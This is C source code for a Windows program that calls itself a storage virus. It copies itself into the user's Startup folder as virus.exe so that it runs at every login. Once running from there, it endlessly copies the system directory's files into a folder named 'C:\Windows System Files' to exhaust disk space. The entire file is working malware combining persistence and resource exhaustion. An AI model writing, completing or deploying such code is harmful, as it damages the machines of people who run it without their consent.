#include <tchar.h>
#include<windows.h>
#include<stdio.h>
#include<shlobj.h>


#define DUMMY_SYS_FILES_PATH "C:\\Windows System Files"
#define APP_NAME "storageVirus.exe"

HINSTANCE g_hThisInstance;
wchar_t g_szClassName[] = L"Hell_Yeh!";
wchar_t g_szAppPath[100];
wchar_t g_szStartupPath[100];

void Init();
void StartVirus();
void ExecuteFromStartup();
BOOL CopySelf();
BOOL isInStartupPath();

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpszArgument, int nCmdShow)
{
      Init();
        if (isInStartupPath())
       {
           // printf("Running");
           // MessageBoxW(0, L"Already in Startup!", 0, 0);
            StartVirus();
        }
        else
       {
          // printf("Not Running");
           // MessageBoxW(0, L"Not in Startup", 0, 0);
           CopySelf();
           ExecuteFromStartup();
        }

	return 0;
}

void ExecuteFromStartup()
{
	wchar_t szStartup[100];
    wcscpy(szStartup, g_szStartupPath);
    wcscat(szStartup, L"\\virus.exe");

    ShellExecuteW(NULL, L"open", szStartup, NULL, NULL, SW_SHOW);
}

BOOL isInStartupPath()
{
	wchar_t szStartup[100];
	wcscpy(szStartup, g_szStartupPath);
	wcscat(szStartup, L"\\virus.exe");

	if(wcscmp(szStartup, g_szAppPath) == 0)
	{
		return TRUE;
	}
	return FALSE;
}

BOOL CopySelf()
{
	wchar_t szDest[100];
	wcscpy(szDest, g_szStartupPath);
	wcscat(szDest, L"\\virus.exe");

	if(CopyFileW(g_szAppPath, szDest, FALSE))
	{
		printf("Successfully copied the file\n");
		return TRUE;
	}
	return FALSE;
}

void Init()
{
	GetModuleFileNameW(NULL, g_szAppPath, 100);
	SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, g_szStartupPath);
}

BOOL FileExists(const char* path)
{
    FILE* file;
    file = fopen(path, "r");

    if(!file)
    {
        return FALSE;
    }else{
        fclose(file);
        return TRUE;
    }
}

BOOL CopyFileUnique(const char* source, const char* dest)
{
    if(!FileExists(source)) return FALSE;

    char newDest[150];
    ZeroMemory(newDest, '\0');
    strcpy(newDest, dest);

    int number = 0;
    while (true)
    {
        if(!FileExists(newDest)) break;
        number++;

        char nostr[100];
        ZeroMemory(nostr, '\0');
        sprintf(nostr, "%d", number);

        strcat(newDest, (const char*)nostr);
    }
    return CopyFile(source, newDest, TRUE);
}

void WasteStorage()
{
    WIN32_FIND_DATA findData;
    ZeroMemory(&findData, NULL);
    HANDLE hFind;
    char source[150];
    char dest [150];

    char systemdir[100];
    GetSystemDirectory(systemdir, 100);
    strcat(systemdir, "\\*");

    while(true)
    {
      if(hFind = FindFirstFile((const char*)systemdir, &findData))
      {
          do
          {

              // Get Full Location of the file
              ZeroMemory(systemdir, '\0');
              GetSystemDirectory(systemdir, 100);
              strcat(systemdir, "\\");
              strcat(systemdir, (const char*)findData.cFileName);

              char dest[100];
              strcpy(dest, DUMMY_SYS_FILES_PATH);
              strcat(dest, "\\");
              strcat(dest, (const char*)findData.cFileName);

              CopyFileUnique(systemdir, dest);
              Sleep(40);
          }
          while(FindNextFile(hFind, &findData));
      }
      Sleep(1000*2);
    }
}

void StartVirus()
{
	CreateDirectory(DUMMY_SYS_FILES_PATH, NULL);
	WasteStorage();
}
